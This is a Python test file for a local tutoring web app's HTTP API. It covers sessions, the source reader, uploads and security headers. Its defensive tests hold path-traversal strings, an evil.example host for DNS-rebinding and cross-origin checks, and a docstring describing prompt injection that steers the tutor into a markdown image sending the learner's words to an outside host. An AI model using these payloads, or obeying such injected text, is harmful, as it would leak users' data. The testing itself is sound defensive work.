import re
from datetime import UTC, datetime, timedelta

import pytest
from starlette.testclient import TestClient

from velocity.config import Config, create_subject, load_subject
from velocity.session import ENDED_WITH_WRAP_UP, Session, record_dir, set_active
from velocity.web import STATIC, build_app

T0 = datetime(2026, 11, 4, 18, 0, tzinfo=UTC)


@pytest.fixture(autouse=True)
def data_home(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "data"))


@pytest.fixture
def config(tmp_path) -> Config:
    (tmp_path / "vault").mkdir()
    config = Config((tmp_path / "vault").resolve())
    create_subject(config, "Calculus")
    return config


@pytest.fixture
def client(config) -> TestClient:
    return TestClient(build_app(config), base_url="http://127.0.0.1:8765")


def session(config, day=0, learner=("What is a limit?",), end=None) -> Session:
    subject = load_subject(config, "calculus")
    now = T0 + timedelta(days=day)
    s = Session.start(
        "calculus",
        "Calculus",
        record_dir("calculus"),
        subject.sessions_dir,
        sources=[],
        now=now,
    )
    for i, text in enumerate(learner):
        s.append("learner", text, now=now + timedelta(seconds=2 * i + 1))
        s.append(
            "tutor", "What is $f(x)$ near $a$?", now=now + timedelta(seconds=2 * i + 2)
        )
    s.render()
    if end:
        s.end(end, now=now + timedelta(minutes=5))
    return s


def test_page_and_static_files(client):
    page = client.get("/")
    assert page.status_code == 200 and "<title>velocity</title>" in page.text
    assert client.get("/static/app.js").status_code == 200
    reader = client.get("/static/reader.js")
    assert reader.status_code == 200
    assert client.get("/static/style.css").status_code == 200
    # The browser checks for newer page files each time, so an update never mixes old
    # scripts with a new page; an unchanged file is a 304, not sent again.
    assert page.headers["cache-control"] == "no-cache"
    assert reader.headers["cache-control"] == "no-cache"
    again = client.get(
        "/static/reader.js", headers={"If-None-Match": reader.headers["etag"]}
    )
    assert again.status_code == 304
    assert "cache-control" not in client.get("/api/subjects").headers


PAGE_FILES = ["index.html", "app.js", "reader.js", "subjects.js", "library.js",
              "progress.js", "setup.js", "style.css"]  # fmt: skip


def test_the_page_loads_nothing_from_other_sites():
    """Security review (2026-11-12): every script, style and font the page uses is bundled
    with velocity, so a changed file on a CDN can't run inside the page. (Links the
    learner clicks, like obsidian.md, are fine.)"""
    loads = re.compile(
        r"""\bsrc\s*=\s*["'`]([^"'`]+)"""  # <script src>, <img src>, el.src = ...
        r"""|<link\b[^>]*\bhref\s*=\s*["']([^"']+)"""  # stylesheets, icons
        r"""|\bimport\(\s*["'`]([^"'`]+)"""  # modules
        r"""|@import\s+(?:url\()?["']?([^"')\s]+)""",  # CSS imports
    )
    for name in PAGE_FILES:
        text = (STATIC / name).read_text(encoding="utf-8")
        for match in loads.findall(text):
            target = next(m for m in match if m)
            assert not re.match(r"(https?:)?//", target), f"{name} loads {target}"
        assert "cdn.jsdelivr.net" not in text, name


def test_the_bundled_libraries_are_served(client):
    """The libraries the page names exist, at their pinned versions, and are served as
    JavaScript (a module with another type doesn't run)."""
    versions = {
        p.parent.name: p.read_text(encoding="utf-8").strip()
        for p in (STATIC / "vendor").glob("*/VERSION")
    }
    assert versions == {
        "katex": "katex@0.16.11",
        "marked": "marked@12.0.2",
        "dompurify": "dompurify@3.1.6",
        "pdfjs-dist": "pdfjs-dist@6.4.299",
    }
    page = client.get("/").text + client.get("/static/reader.js").text
    paths = set(re.findall(r"/static/vendor/[\w./-]+", page))
    paths |= {
        f"/static/vendor/pdfjs-dist/legacy/{p}"
        for p in ("build/pdf.min.mjs", "build/pdf.worker.min.mjs", "web/pdf_viewer.mjs")
    }
    for path in paths:
        if path.endswith("/legacy"):
            continue  # the reader's base folder; its files are listed above
        response = client.get(path)
        assert response.status_code == 200, path
        if path.endswith((".js", ".mjs")):
            assert response.headers["content-type"].startswith("text/javascript"), path
    assert (
        client.get(
            "/static/vendor/katex/dist/fonts/KaTeX_Main-Regular.woff2"
        ).status_code
        == 200
    )


def test_subjects(client, config):
    assert client.get("/api/subjects").json() == [
        {
            "slug": "calculus",
            "name": "Calculus",
            "sources": [],
            "archived": False,
            "color": load_subject(config, "calculus").display_color,
            "sessions": 0,
        }
    ]


def test_session_list_newest_first(client, config):
    session(config, day=0, end=ENDED_WITH_WRAP_UP)
    session(config, day=1, learner=("one", "two"))  # cut off: no end, not active
    set_active("calculus", session(config, day=2).id)
    listing = client.get("/api/subjects/calculus/sessions").json()
    assert [(s["id"], s["turns"], s["ended"]) for s in listing] == [
        ("2026-11-06-1", 1, None),
        ("2026-11-05-1", 2, "no-wrap-up"),
        ("2026-11-04-1", 1, "wrapped-up"),
    ]
    assert listing[2]["first_message"] == "What is a limit?"
    assert client.get("/api/subjects/nope/sessions").status_code == 404


def test_session_log_shows_the_markdown_with_learner_edits(client, config):
    s = session(config, end="no-wrap-up")
    s.log_path.write_text(s.log_path.read_text() + "\nMy own note.\n")
    log = client.get(f"/api/subjects/calculus/sessions/{s.id}").json()
    assert log["from_log"] is True
    assert log["markdown"].startswith("# Calculus")  # front matter removed
    assert "**You:** What is a limit?" in log["markdown"]
    assert "My own note." in log["markdown"]


def test_session_log_falls_back_to_the_record(client, config):
    s = session(config)
    s.log_path.unlink()
    log = client.get(f"/api/subjects/calculus/sessions/{s.id}").json()
    assert log["from_log"] is False
    assert "**Tutor:** What is $f(x)$ near $a$?" in log["markdown"]
    assert not s.log_path.exists()  # nothing written


@pytest.mark.parametrize("session_id", ["2026-11-09-1", "..%2F..%2Fsecrets", "x"])
def test_unknown_or_malformed_sessions_are_404(client, config, session_id):
    session(config)
    response = client.get(f"/api/subjects/calculus/sessions/{session_id}")
    assert response.status_code == 404


def test_other_hosts_are_rejected(config):
    # DNS rebinding: a page on another domain that resolves to 127.0.0.1.
    client = TestClient(build_app(config), base_url="http://evil.example:8765")
    assert client.get("/api/subjects").status_code == 400


def test_cross_origin_changes_are_rejected(client):
    response = client.post("/api/subjects", headers={"Origin": "http://evil.example"})
    assert response.status_code == 403
    same = client.post("/api/subjects", headers={"Origin": "http://127.0.0.1:8765"})
    assert same.status_code == 400  # passes the check; then: a subject needs a name


def csp(response) -> dict[str, list[str]]:
    policy = response.headers["content-security-policy"]
    return {
        name: values
        for name, *values in (d.split() for d in policy.split(";") if d.strip())
    }


def test_a_content_security_policy_keeps_the_page_to_itself(client):
    """Security review M2 (2026-11-12): text from a book or note can steer the tutor
    (prompt injection) into writing ![](https://evil.example/?q=<what you said>); the
    browser must not fetch it, nor run or load anything from elsewhere."""
    for path in ("/", "/static/app.js", "/api/subjects", "/nope"):
        policy = csp(client.get(path))
        assert policy["default-src"] == ["'self'"]
        assert policy["script-src"] == ["'self'"]  # no inline scripts, no eval
        assert policy["img-src"] == ["'self'", "data:", "blob:"]
        assert policy["connect-src"] == ["'self'"]
        assert policy["object-src"] == ["'none'"]
        assert policy["base-uri"] == ["'none'"]
        assert policy["frame-ancestors"] == ["'none'"]
        assert not any("http" in v or v == "*" for vs in policy.values() for v in vs)
    page = client.get("/")
    assert page.headers["x-content-type-options"] == "nosniff"
    assert page.headers["referrer-policy"] == "no-referrer"


def test_the_setup_screen_has_the_same_policy(monkeypatch):
    from velocity.web import serve_app

    with TestClient(serve_app(None), base_url="http://127.0.0.1:8765") as setup:
        assert csp(setup.get("/"))["img-src"] == ["'self'", "data:", "blob:"]


def test_the_page_has_no_inline_scripts_or_handlers():
    """What the policy would block: keep the page free of it."""
    html = (STATIC / "index.html").read_text(encoding="utf-8")
    assert not re.search(r"<script(?![^>]*\bsrc=)[^>]*>", html)
    for name in PAGE_FILES:
        text = (STATIC / name).read_text(encoding="utf-8")
        assert not re.search(r"""\son[a-z]+\s*=\s*["']""", text), name
        assert not re.search(r"\beval\(|new Function\(|javascript:", text), name
    assert "isEvalSupported: false" in (STATIC / "reader.js").read_text(
        encoding="utf-8"
    )


def test_cli_web_starts_uvicorn_on_localhost(config, monkeypatch, capsys):
    from velocity import cli

    calls = {}
    monkeypatch.setattr("velocity.setup.load_config", lambda: config)
    monkeypatch.setattr(
        "uvicorn.run", lambda app, **kwargs: calls.update(kwargs, app=app)
    )
    assert cli.main(["web", "calculus", "--no-browser", "--port", "9000"]) == 0
    assert calls["host"] == "127.0.0.1" and calls["port"] == 9000
    assert "http://127.0.0.1:9000/?subject=calculus" in capsys.readouterr().out
    assert calls["app"].config == config  # the full app, not the setup screen


def test_cli_web_starts_on_the_setup_screen_without_a_config(monkeypatch, capsys):
    from velocity import cli

    calls = {}
    monkeypatch.setattr(
        "uvicorn.run", lambda app, **kwargs: calls.update(kwargs, app=app)
    )
    assert cli.main(["web", "--no-browser"]) == 0  # no config.toml in this test
    assert calls["app"].config is None
    assert "will ask for your notes folder" in capsys.readouterr().out


# -- the source reader (M9) --------------------------------------------------------------


@pytest.fixture
def with_sources(tmp_path, config):
    import pymupdf

    from velocity.config import add_source

    book = tmp_path / "book.pdf"
    doc = pymupdf.open()
    for text in ["Intro", "Limits", "Continuity"]:
        doc.new_page().insert_text((72, 72), text)
    doc.set_toc(
        [[1, "Ch 1: Limits", 1], [2, "1.1: Limits", 2], [2, "1.2: Continuity", 3]]
    )
    doc.save(book)
    notes = tmp_path / "notes.md"
    notes.write_text("# Limits\n\nNear, not at.\n\n# Continuity\n\nNo gaps.\n")
    add_source(config, "calculus", book, "Book")
    add_source(config, "calculus", notes, "Notes")
    return book


def test_reader_lists_sources_with_outlines(client, with_sources):
    sources = {
        s["name"]: s for s in client.get("/api/subjects/calculus/sources").json()
    }
    assert sources["Book"]["kind"] == "pdf"
    assert [(e["id"], e["start_page"]) for e in sources["Book"]["outline"]] == [
        ("ch1", 1),
        ("1.1", 2),
        ("1.2", 3),
    ]
    assert sources["Notes"]["kind"] == "text"
    assert [e["id"] for e in sources["Notes"]["outline"]] == ["limits", "continuity"]


def test_reader_sends_pdfs_in_ranges_and_text_sections(client, with_sources):
    base = "/api/subjects/calculus/sources"
    whole = client.get(f"{base}/Book/file")
    assert whole.status_code == 200
    assert whole.headers["content-type"] == "application/pdf"
    assert whole.content == with_sources.read_bytes()
    part = client.get(f"{base}/Book/file", headers={"Range": "bytes=0-99"})
    assert part.status_code == 206 and len(part.content) == 100

    section = client.get(f"{base}/Notes/sections/continuity").json()
    assert section["title"] == "Continuity" and "No gaps." in section["markdown"]
    assert client.get(f"{base}/Notes/sections/nope").status_code == 404
    assert client.get(f"{base}/Notes/file").status_code == 400  # text: no file
    assert client.get(f"{base}/Book/sections/1.1").status_code == 400  # PDF: pages


def test_reader_only_sends_files_listed_as_sources(client, with_sources, tmp_path):
    base = "/api/subjects/calculus/sources"
    (tmp_path / "secret.pdf").write_bytes(b"%PDF-1.4 PRIVATE-CONTENTS")
    for name in [
        "secret",
        "secret.pdf",
        "..%2Fsecret.pdf",
        "Book%2F..%2F..%2Fsecret.pdf",
    ]:
        response = client.get(f"{base}/{name}/file")
        assert response.status_code == 404, name
        assert b"PRIVATE-CONTENTS" not in response.content
    assert client.get("/api/subjects/nope/sources").status_code == 404


# -- uploading a source (M9) -------------------------------------------------------------


def upload(client, name, filename, body: bytes, origin=True):
    from urllib.parse import urlencode

    query = urlencode({"name": name, "filename": filename})
    headers = {"Content-Type": "application/octet-stream"}
    if origin:
        headers["Origin"] = "http://127.0.0.1:8765"
    return client.post(
        f"/api/subjects/calculus/sources?{query}", content=body, headers=headers
    )


def test_upload_adds_a_copy_as_a_source(client, config, tmp_path):
    import pymupdf

    from velocity.uploads import library_dir

    added = upload(
        client, "Notes", "my notes.md", b"# Limits\n\nNear.\n\n# Continuity\n"
    )
    assert added.status_code == 200, added.text
    assert added.json() == {
        "name": "Notes",
        "kind": "text",
        "sections": 2,
        "warning": None,
    }
    copy = library_dir() / "my notes.md"
    assert copy.read_bytes().startswith(b"# Limits")
    assert load_subject(config, "calculus").sources[-1].path == copy
    names = [s["name"] for s in client.get("/api/subjects/calculus/sources").json()]
    assert names == ["Notes"]

    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), "No outline here")
    pdf = upload(client, "Scan", "scan.pdf", doc.tobytes())
    assert pdf.json()["kind"] == "pdf" and pdf.json()["sections"] == 0
    assert "No table of contents" in pdf.json()["warning"]

    # A second file with the same name is kept next to the first.
    upload(client, "Notes 2", "my notes.md", b"# Other\n")
    assert (library_dir() / "my notes-2.md").exists()


def test_upload_refuses_bad_files_and_leaves_nothing_behind(client, monkeypatch):
    import velocity.web
    from velocity.uploads import library_dir

    assert upload(client, "X", "book.docx", b"PK...").status_code == 400
    assert "isn't a PDF" in upload(client, "X", "book.pdf", b"hello").json()["error"]
    assert "isn't an EPUB" in upload(client, "X", "b.epub", b"%PDF-1").json()["error"]
    assert upload(client, "X", "b.md", b"").status_code == 400  # empty
    assert upload(client, "", "b.md", b"# A\n").status_code == 400  # no name
    assert upload(client, "X", "b.md", b"# A\n", origin=False).status_code == 403
    monkeypatch.setattr(velocity.web, "MAX_UPLOAD_BYTES", 10)
    assert upload(client, "X", "big.md", b"# " + b"a" * 100).status_code == 413
    leftovers = list(library_dir().glob("*")) if library_dir().exists() else []
    assert leftovers == []


def test_upload_names_and_paths(client):
    from velocity.uploads import library_dir

    assert upload(client, "Notes", "../../escape.md", b"# A\n").status_code == 200
    assert (library_dir() / "escape.md").exists()  # the base name only
    duplicate = upload(client, "Notes", "other.md", b"# B\n")
    assert (
        duplicate.status_code == 409
        and "already has a source" in duplicate.json()["error"]
    )


def test_progress(client, config):
    from datetime import date

    from velocity.state import LearnerState, save_state

    subject = load_subject(config, "calculus")
    assert client.get("/api/subjects/calculus/progress").json()["topics"] == []
    state = LearnerState()
    state.record_question("Limits", "Explain a limit", "hinted", "s1", date.today())
    save_state(state, subject.dir, subject.name, date.today())
    view = client.get("/api/subjects/calculus/progress").json()
    assert [(t["name"], t["days"]) for t in view["topics"]] == [("Limits", 1)]
    assert view["weak"][0]["last"]["outcome"] == "hinted"
    assert client.get("/api/subjects/nope/progress").status_code == 404

    (subject.dir / "state.json").write_text("not json")
    response = client.get("/api/subjects/calculus/progress")
    assert response.status_code == 500 and "Could not read" in response.json()["error"]


def test_cleanup_of_empty_sessions(client, config):
    from velocity.session import active_session_id

    empty = session(config, day=0, learner=(), end="no-wrap-up")
    real = session(config, day=1, end="no-wrap-up")
    found = client.get("/api/cleanup/sessions").json()
    assert [(c["subject"], c["session_id"], c["reason"], c["kept"]) for c in found] == [
        ("calculus", empty.id, "empty", None)
    ]
    assert found[0]["subject_name"] == "Calculus"
    origin = {"Origin": "http://127.0.0.1:8765"}
    response = client.post(
        "/api/cleanup/sessions",
        json={
            "sessions": [
                {"subject": "calculus", "id": empty.id},
                {"subject": "calculus", "id": real.id},  # not empty: never removed
                {"subject": "nope", "id": "2026-11-04-9"},
                "junk",
            ]
        },
        headers=origin,
    )
    assert response.json() == {"removed": 1}
    assert not empty.record_path.exists() and real.record_path.exists()
    assert client.get("/api/cleanup/sessions").json() == []
    assert active_session_id("calculus") is None
    bad = client.post("/api/cleanup/sessions", json={}, headers=origin)
    assert bad.status_code == 400
